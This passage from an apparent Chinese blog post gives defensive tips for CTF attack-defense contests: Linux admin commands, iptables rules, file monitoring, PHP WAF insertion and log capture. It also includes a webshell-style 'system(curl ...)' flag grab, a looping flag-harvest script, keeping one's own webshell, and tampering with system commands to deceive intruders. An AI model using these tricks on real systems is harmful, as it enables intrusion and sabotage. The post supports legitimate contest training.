<h4 id="How-to-Defend"><a href="#How-to-Defend" class="headerlink" title="How to Defend"></a>How to Defend</h4><h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><p>我们先总结一下线下赛的防护工作中常用的一些命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">ssh &lt;-p 端口&gt; username@ip</span><br><span class="line">scp 文件路径  username@ip:存放路径</span><br><span class="line">cat /root/.bash_history</span><br><span class="line"><span class="comment">#显示最近登录的5个帐号</span></span><br><span class="line">last -n 5|awk <span class="string">'&#123;print $1&#125;'</span></span><br><span class="line"><span class="comment">#显示/etc/passwd的账户</span></span><br><span class="line">cat /etc/passwd|awk -F <span class="string">':'</span> <span class="string">'&#123;print $1&#125;'</span></span><br><span class="line"><span class="comment">#查看UID为0的帐号</span></span><br><span class="line">awk -F: <span class="string">'&#123;if($3==0)print $1&#125;'</span> /etc/passwd</span><br><span class="line"><span class="comment">#查找777的权限的文件</span></span><br><span class="line">find . -name <span class="string">"*.php"</span> -perm 4777</span><br><span class="line"><span class="comment">#查找24小时内被修改的PHP文件</span></span><br><span class="line">find ./ -mtime 0 -name <span class="string">"*.php"</span></span><br><span class="line"><span class="comment">#查看进程</span></span><br><span class="line">ps aux | grep pid或者进程名　　　　</span><br><span class="line"><span class="comment">#查看已建立的网络连接及进程</span></span><br><span class="line">netstat -antulp | grep EST</span><br><span class="line"><span class="comment">#查看指定端口被哪个进程占用</span></span><br><span class="line">lsof -i:端口号 或者 netstat -tunlp|grep 端口号</span><br><span class="line"><span class="comment">#结束进程命令</span></span><br><span class="line"><span class="built_in">kill</span> PID</span><br><span class="line">killall &lt;进程名&gt;</span><br><span class="line">pkill &lt;进程名&gt;</span><br><span class="line">pkill -u用户名</span><br><span class="line"><span class="comment">#封杀某个IP或者ip段</span></span><br><span class="line">iptables -I INPUT -s source_ip[/mask] -j DROP</span><br><span class="line"><span class="comment">#禁止从某个主机ssh远程访问登陆到本机</span></span><br><span class="line">iptable -t filter -A INPUT -s source_ip[/mask] -p tcp --dport 22 -j DROP</span><br><span class="line"><span class="comment">#备份mysql数据库</span></span><br><span class="line">mysqldump -u 用户名 -p 密码 数据库名 &gt; bak.sql</span><br><span class="line">mysqldump --all-databases &gt; bak.sql</span><br><span class="line"><span class="comment">#还原mysql数据库</span></span><br><span class="line">mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql</span><br><span class="line"><span class="comment">#定时任务，在固定的时间间隔执行指定的系统指令或shell script</span></span><br><span class="line">crontab [-u user] file_name</span><br><span class="line">crontab [-u user] [-e |-l| -r]</span><br><span class="line"><span class="comment">#检测所有的tcp连接数量及状态</span></span><br><span class="line">netstat -ant|awk|grep|sed -e -e|sort|uniq -c|sort -rn</span><br><span class="line"><span class="comment">#查看页面访问排名前十的IP</span></span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/access.log|cut -f1 -d|sort|uniq -c|sort -k  -r|head -　　</span><br><span class="line"><span class="comment">#查看页面访问排名前十的URL</span></span><br><span class="line">cat /var/<span class="built_in">log</span>/apache2/access.log|cut -f4 -d|sort|uniq -c|sort -k  -r|head -</span><br></pre></td></tr></table></figure>
<h5 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h5><p>为了监控我们的web目录，我们可以对文件的增加或修改等操作进行限制，粗暴一点的话，就禁止任何文件产生变化。</p>
<ul>
<li><p>使用系统 <code>chattr +i</code>命令</p>
<p>Linux下的文件有着隐藏属性，可以用<code>lsattr</code>命令查看。其中有一个<code>i</code>属性，表示不得更动任意文件或目录。如果你已经有<code>root</code>或者<code>sudo</code>权限了，那么你可以使用<code>chattr +i</code> 修改文件隐藏属性，这样所有用户都不能对该文件或者目录进行修改删除等操作（包括<code>root</code>），如果想进行修改，必须用<code>chattr -i</code>取消隐藏属性。</p>
<blockquote>
<p>e.g.</p>
<p>防止系统中某个关键文件被修改：<code>chattr +i /etc/profile</code></p>
<p>将/var/www/html目录下的文件设置为不允许任何人修改： <code>chattr -R +i /var/www/html</code></p>
</blockquote>
</li>
<li><p>使用python的第三方库pyinotify</p>
<p>python的第三方库pyinotify可以让我们很方便地实现这些功能。但是由于是第三方库，线下赛中通常没法联网安装库，所以我们可以提前准备好source code以在比赛时安装。</p>
<blockquote>
<p>下载地址：<a href="https://pypi.python.org/pypi/pyinotify" target="_blank" rel="noopener">https://pypi.python.org/pypi/pyinotify</a> （如果比赛可以联网，建议直接通过pip安装）</p>
<p>安装方法：解压，然后执行<code>sudo pythonXXX setup.py install</code></p>
<p>使用方法：<code>python -m pyinotify monitoring_path</code></p>
</blockquote>
<p>但由于监控事件太过杂，很多并不是我们关注的，并且我们不仅仅要监控，还需要对某些操作进行自动处理，因此我们可以用脚本针对性地实现我们需要的功能：<a href="https://github.com/edwardchoijc/ctf-toolkit/tree/master/Linux/FileMonitor/pyinotify" target="_blank" rel="noopener">monitor_withPyinotify</a>。</p>
</li>
</ul>
<h5 id="网络控制"><a href="#网络控制" class="headerlink" title="网络控制"></a>网络控制</h5><p>网络防护一定少不了 iptables了，但使用iptables需要有管理员权限。对于比赛环境，我们完全可以配置一个近乎苛刻的配置防火墙策略。</p>
<ul>
<li><p>只开放一些比赛的必要端口，也可以防止后门的连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开放ssh</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT</span><br><span class="line"><span class="comment">#打开80端口</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br><span class="line"><span class="comment">#开启多端口简单用法</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 22,80,8080,8081 -j ACCEPT</span><br><span class="line"><span class="comment">#允许外部访问本地多个端口 如8080，8081，8082,且只允许是新连接、已经连接的和已经连接的延伸出新连接的会话</span></span><br><span class="line">iptables -A INPUT -p tcp -m multiport --dport 8080,8081,8082,12345 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp -m multiport --sport 8080,8081,8082,12345 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
</li>
<li><p>限制ssh登陆，进行访问控制</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#禁止从xx.xx.xx.xx远程登陆到本机</span></span><br><span class="line">iptables -t filter -A INPUT -s xx.xx.xx.xx -p tcp --dport 22 -j DROP</span><br><span class="line"><span class="comment">#允许xx.xx.xx.xx网段远程登陆访问ssh</span></span><br><span class="line">iptables -A INPUT -s xx.xx.xx.1/24 -p tcp --dport 22 -j ACCEPT</span><br></pre></td></tr></table></figure>
</li>
<li><p>限制IP连接数和连接速率</p>
<p>我们可以限制IP的网络连接数和速度等，限制过快的连接频率，这样可以在一定程度上限制对方的扫描器。狠一点的话，甚至可以让对方只能以手工点网页的速度与访问</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#单个IP的最大连接数为 30</span></span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j REJECT</span><br><span class="line"><span class="comment">#单个IP在60秒内只允许最多新建15个连接</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --update --seconds 60 --hitcount 15 -j REJECT</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m recent --name BAD_HTTP_ACCESS --<span class="built_in">set</span> -j ACCEPT</span><br><span class="line"><span class="comment">#允许外部访问本机80端口，且本机初始只允许有10个连接，每秒新增加2个连接，如果访问超过此限制则拒接 （此方式可以限制一些攻击）</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 2/s --<span class="built_in">limit</span>-burst 10 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>再猥琐一点，可以定时断开已经建立的连接，让对方只能断断续续的访问</p>
</li>
<li><p>数据包简单识别，防止端口复用类的后门或者shell</p>
<p>假设病毒木马程序通过<code>22</code>，<code>80</code>端口向服务器外传送数据，这种方式向外发的数据不是我们通过访问网页请求而回应的数据包。我们可以禁止这些没有通过请求回应的数据包。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 443 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
</li>
<li><p>限制访问</p>
<p>如果对方来势太凶，我们可以限制或者封杀他们的ip段。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#禁止从客户机1.1.1.4访问1.1.1.5上的任何服务</span></span><br><span class="line">iptable -t filter -A FORWARD -s 1.1.1.4 -d 1.1.1.5 -j DROP</span><br><span class="line"><span class="comment">#封杀1.1.1.4这个IP或者某个ip段</span></span><br><span class="line">iptables -I INPUT -s 1.1.1.4 -j DROP</span><br><span class="line">iptables -I INPUT -s 1.1.1.1/24 -j DROP</span><br></pre></td></tr></table></figure>
</li>
<li><p>过滤异常报文</p>
<p>iptables有一个TCP匹配扩展协议–tcp-flags，功能是过滤TCP中的一些包，比如SYN包，ACK包，FIN包，RST包等等。举个例子，我们知道SYN是建立连接，RST是重置连接，如果这两个同时出现，就知道这样的包是有问题的，应该丢弃。下面的例子是利用–tcp-flags参数，对一些包进行标识过滤，扔掉异常的数据包。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#表示 SYN,FIN,ACK,RST的标识都检查，但只匹配SYN标识</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,FIN,ACK,RST SYN</span><br><span class="line"><span class="comment">#匹配SYN标识位</span></span><br><span class="line">iptables -A INPUT -p tcp --syn</span><br><span class="line"><span class="comment">#检查所有的标识位，匹配到FIN URG PSH的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL FIN,URG,PSH -j DROP</span><br><span class="line"><span class="comment">#丢弃没标志位的包</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP</span><br><span class="line"><span class="comment">#匹配到SYN ACK FIN URG RST PSH的丢弃（类似的操作自行举一反三）</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG,PSH -j DROP</span><br><span class="line"><span class="comment">#匹配到 SYN,RST的丢弃</span></span><br><span class="line">iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP</span><br></pre></td></tr></table></figure>
</li>
<li><p>防DDOS</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 80 -m <span class="built_in">limit</span> --<span class="built_in">limit</span> 20/minute --<span class="built_in">limit</span>-burst 100 -j ACCEPT</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>-m limit</code>：启用limit扩展<br><code>–limit 20/minute</code>：允许最多每分钟10个连接<br><code>–limit-burst 100</code>：当达到100个连接后，才启用上述20/minute限制</p>
</blockquote>
<p>丢弃陌生的TCP响应包,防止反弹式攻击</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -m state --state NEW -p tcp ! --syn -j DROP</span><br><span class="line">iptables -A FORWARD -m state --state NEW -p tcp --syn -j DROP</span><br></pre></td></tr></table></figure>
<p>提供一个通用的firewall脚本<a href="https://github.com/edwardchoijc/ctf-toolkit/blob/master/Linux/Firewall/firewall.sh" target="_blank" rel="noopener">firewall.sh</a>，我们可以传到服务器上一键执行，相关参数可以查阅资料详细了解。</p>
<blockquote>
<p>注意，对于不同的<code>iptables</code>版本，一些参数的用法可以会有略微的差异，使用时我们可能要根据需要进行修改。</p>
</blockquote>
</li>
</ul>
<h5 id="修复漏洞"><a href="#修复漏洞" class="headerlink" title="修复漏洞"></a>修复漏洞</h5><p>CTF比赛中修复漏洞主要就是为了防止其他队伍的入侵了。</p>
<ul>
<li><p>删站（不建议）</p>
<p>如果赛组没有明确禁止，这是最粗暴的姿势，只留自己的webshell。</p>
</li>
<li><p>删页面</p>
<p>大部分举办方还是会明确禁止删除网站的，通常赛组会定期访问网站主页（一般来说），从而确定网站是否正常运行。其实我们没必要删除整个网站，只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等。</p>
</li>
<li><p>破坏正常功能</p>
<p>如果明确不能删除任何页面，可以选择让这些漏洞点的功能函数（或者其依赖的功能函数）失效。比如上传点，如果考虑过滤挺麻烦，又不能删页面，那么我们可以找到这个漏洞网页，改掉或者删掉文件里对应的类似<code>upload</code>等这种功能调用函数。</p>
</li>
<li><p>正常修补手段</p>
<p>规则限定很严的情况下，我们还是采用正常手法吧，修改服务配置、安装补丁、下载更新的软件版本、加过滤等等。</p>
<blockquote>
<p>第1~3种方法其实都算不上修补漏洞了，真实环境下哪能这么干。</p>
</blockquote>
</li>
</ul>
<h5 id="上WAF"><a href="#上WAF" class="headerlink" title="上WAF"></a>上WAF</h5><p>可以使用第三方软件的话，装个安全狗之类的吧。</p>
<blockquote>
<p>下载链接：<a href="http://www.safedog.cn/website_safedog.html" target="_blank" rel="noopener">http://www.safedog.cn/website_safedog.html</a></p>
</blockquote>
<p>也可以搜集或者自己实现一些脚本或者工具备用。</p>
<blockquote>
<p>本人收集的一些WAF：<a href="https://github.com/edwardchoijc/ctf-toolkit/tree/master/Linux/WAF" target="_blank" rel="noopener">https://github.com/edwardchoijc/ctf-toolkit/tree/master/Linux/WAF</a></p>
</blockquote>
<p>使用方法：</p>
<ol>
<li><p>将waf.php传到要包含的文件的目录</p>
</li>
<li><p>在页面中加入防护，有两种做法，根据情况二选一：</p>
<ul>
<li><p>在所需要防护的页面加入代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">'waf.php'</span>);</span><br></pre></td></tr></table></figure>
<p>这样就可以做到页面防注入、跨站。</p>
<p>如果想整站防注，就在网站的一个公用文件中添加上述代码来调用WAF</p>
<blockquote>
<p>常用的php的WAF添加路径：</p>
<ul>
<li>PHPCMS V9：<code>\phpcms\base.php</code></li>
<li>PHPWIND8.7：<code>\data\sql_config.php</code></li>
<li>DEDECMS5.7：<code>\data\common.inc.php</code></li>
<li>DiscuzX2：<code>\config\config_global.php</code></li>
<li>Wordpress：<code>\wp-config.php</code></li>
<li>Metinfo：<code>\include\head.php</code></li>
</ul>
</blockquote>
</li>
</ul>
</li>
</ol>
<ul>
<li><p>在每个文件最前加上上述代码</p>
<p>在<code>php.ini</code>中找到并添加：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Automatically add files before <span class="keyword">or</span> after any PHP document.</span><br><span class="line">auto_prepend_file = waf.php的路径;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>还有最简便的方法，可以用一条命令解决，以php为例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo find /var/www/html/path_you_want -<span class="built_in">type</span> f -path <span class="string">"*.php"</span> | xargs sed -i <span class="string">"s/&lt;?php/&lt;?php\nrequire_once('\/tmp\/waf.php');\n/g"</span></span><br><span class="line"><span class="comment">#意思就是查找需要加waf的目录下所有php文件，在头部添加一句，用require_once函数引入/tmp/waf.php文件。因为sed命令利用 / 区分文件中的原字符串和修改的字符串，所以我们要对 / 进行转义。类似于在单引号中再次使用单引号时我们也要用反斜杠转义。</span></span><br></pre></td></tr></table></figure>
<p>最后，提醒：需要注意的是，部署waf可能会导致服务不可用，部署后要密切留意自己服务器的状态。</p>
<h5 id="流量和日志分析"><a href="#流量和日志分析" class="headerlink" title="流量和日志分析"></a>流量和日志分析</h5><p>通过对流量、日志的分析，可以：</p>
<ol>
<li><p>感知可能正在发生的攻击，从而规避存在的安全风险</p>
</li>
<li><p>应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失</p>
</li>
<li><p>某些情况下还能对攻击进行重放复现</p>
<p>​</p>
</li>
</ol>
<ul>
<li><p>流量分析</p>
<p>在比赛机器上使用下述命令进行流量抓取：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -s 0 -w flow_log.pcap port 9999</span><br></pre></td></tr></table></figure>
<p>然后在本地对抓取的pcap使用wireshark进行分析</p>
</li>
<li><p>日志分析</p>
<p>记录log的脚本网上有很多，大家可以自行搜索。例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);</span><br><span class="line">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];<span class="comment">//记录访问者的ip</span></span><br><span class="line">$filename = $_SERVER[<span class="string">'PHP_SELF'</span>];<span class="comment">//访问者要访问的文件名</span></span><br><span class="line">$parameter = $_SERVER[<span class="string">"QUERY_STRING"</span>];<span class="comment">//访问者要请求的参数</span></span><br><span class="line">$method = $_SERVER[<span class="string">'REQUEST_METHOD'</span>];<span class="comment">//请求方法</span></span><br><span class="line">$time = date(<span class="string">'Y-m-d H:i:s'</span>,time());<span class="comment">//访问时间</span></span><br><span class="line">$post = file_get_contents(<span class="string">"php://input"</span>,<span class="string">'r'</span>);<span class="comment">//接收POST数据</span></span><br><span class="line">$others    = <span class="string">'...其他你想得到的信息...'</span>;</span><br><span class="line">$logadd = <span class="string">'访问时间：'</span>.$time.<span class="string">'--&gt;'</span>.<span class="string">'访问链接：http://'</span>.$ip.$filename.<span class="string">'?'</span>.$parameter.<span class="string">'请求方法：'</span>.$method.<span class="string">"\r\n"</span>;</span><br><span class="line"><span class="comment">// log记录</span></span><br><span class="line">$fh = fopen(<span class="string">"log.txt"</span>, <span class="string">"a"</span>);</span><br><span class="line">fwrite($fh, $logadd);</span><br><span class="line">fwrite($fh,print_r($_COOKIE, <span class="keyword">true</span>).<span class="string">"\r\n"</span>);</span><br><span class="line">fwrite($fh,$others.<span class="string">"\r\n"</span>);</span><br><span class="line">fclose($fh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>日志分析工具有：</p>
<ul>
<li><a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="noopener">LogForensics@腾讯实验室</a></li>
<li><a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="noopener">北风飘然@金乌网络安全实验室</a></li>
<li><a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="noopener">piaox的多线程WEB安全日志分析脚本</a></li>
<li><a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="noopener">SecSky的Web日志安全分析工具</a></li>
<li><a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="noopener">鬼魅羊羔的Web日志分析脚本</a></li>
</ul>
</li>
</ul>
<h5 id="假flag"><a href="#假flag" class="headerlink" title="假flag"></a>假flag</h5><p>如果说很不幸，我们前面的关卡都被突破了（实际上我都感觉前面那些设置都有点“搅屎”的味道了，不过还是希望师傅们能一起来讨论讨论有没有什么骚姿势，以及绕过它们的方法）。假设真的被突破了，对于CTF线下赛来说，我们最终的目的都是拿到flag。通常我们会在服务器上执行类似于<code>getflag</code>命令，或者<code>curl</code>访问某个url获取flag，然后获取到一个字符串，然后在答题平台上提交这段字符串即可获取分数。但有时候getflag时因为webshell丢了或其他原因，会导致服务器显示Error，那我们是不是可以故意利用这种报错来欺骗不细心的竞争对手呢？</p>
<p>怎样实现？比如我们可以添加<code>alias</code>别名，或者我们可以把这些命令更改或者替换掉，换成一些伪装命令程序。再换一层想想，接着上面的思路，如果我们替换或者伪装了系统命令，对方getshell之后，进来发现<code>cd</code>，<code>ls</code>等命令都没法用，会怎么样呢？</p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="flag获取"><a href="#flag获取" class="headerlink" title="flag获取"></a>flag获取</h5><p>线下赛可以直接使用<code>&lt;?php echo system(&quot;curl 10.0.0.2&quot;); ?&gt;</code>之类的</p>
<p>或者</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	flag=$(curl <span class="string">'http://xx.xx.xx.xx:8080'</span>)</span><br><span class="line">	curl --cookie <span class="string">"PHPSESSID=YourCookie;"</span> --data <span class="string">"key="</span><span class="variable">$&#123;flag&#125;</span> <span class="string">"http://XX.XX.XX.XX/index.php/submit"</span></span><br><span class="line">	sleep 1s</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h5 id="批量提交flag"><a href="#批量提交flag" class="headerlink" title="批量提交flag"></a>批量提交flag</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line">server_host = <span class="string">'xx.xx.xx.xx'</span></span><br><span class="line">server_port = <span class="number">80</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(team_token, flag, host=server_host, port=server_port, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> team_token <span class="keyword">or</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'team token or flag not found'</span>)</span><br><span class="line">    conn = httplib.HTTPConnection(host, port, timeout=timeout)</span><br><span class="line">    params = urllib.urlencode(&#123;</span><br><span class="line">        <span class="string">'token'</span>: team_token,</span><br><span class="line">        <span class="string">'flag'</span>: flag,</span><br><span class="line">    &#125;)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn.request(<span class="string">'POST'</span>, <span class="string">'/api/submit_flag'</span>, params, headers)</span><br><span class="line">    response = conn.getresponse()</span><br><span class="line">    data = response.read()</span><br><span class="line">    <span class="keyword">return</span> json.loads(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'usage: ./submitflag.py $team_token $flag'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    host = server_host</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">print</span> json.dumps(submit(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], host=host), indent=<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>refer: </p>
<p><a href="http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://www.anquanke.com/post/id/86984" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86984</a></p>
<p><a href="http://tinyfisher.github.io/security/2017/10/02/CTF" target="_blank" rel="noopener">http://tinyfisher.github.io/security/2017/10/02/CTF</a></p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        
  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
    <div>梦想还是要有的，万一实现了呢？</div>
    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
      <span>赏</span>
    </button>
    <div id="QR" style="display: none;">
      
        <div id="wechat" style="display: inline-block">
          <img id="wechat_qr" src="/images/wechat.JPG" alt="Edward Choi WeChat Pay"/>
          <p>微信打赏</p>
        </div>
      
      
        <div id="alipay" style="display: inline-block">
          <img id="alipay_qr" src="/images/alipay.JPG" alt="Edward Choi Alipay"/>
          <p>支付宝打赏</p>
        </div>
      
    </div>
  </div>


      
    </div>

    <div>
      
        
  <ul class="post-copyright">
    <li class="post-copyright-author">
      <strong>Post author:</strong>
      Edward Choi
    </li>
    <li class="post-copyright-link">
      <strong>Post link:</strong>
      <a href="https://edwardchoijc.github.io/CTF线下AWD经验总结.html" title="CTF线下AWD经验总结">https://edwardchoijc.github.io/CTF线下AWD经验总结.html</a>
    </li>
    <li class="post-copyright-license">
      <strong>Copyright Notice: </strong>
      All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
    </li>
  </ul>


      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/内网渗透/" rel="tag"># 内网渗透</a>
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
        </div>
      

      
        
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/git的简介与常用指令.html" rel="next" title="Git的简介与常用指令">
                <i class="fa fa-chevron-left"></i> Git的简介与常用指令
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/Hydra的简介与使用介绍.html" rel="prev" title="Hydra的简介与使用介绍">
                Hydra的简介与使用介绍 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
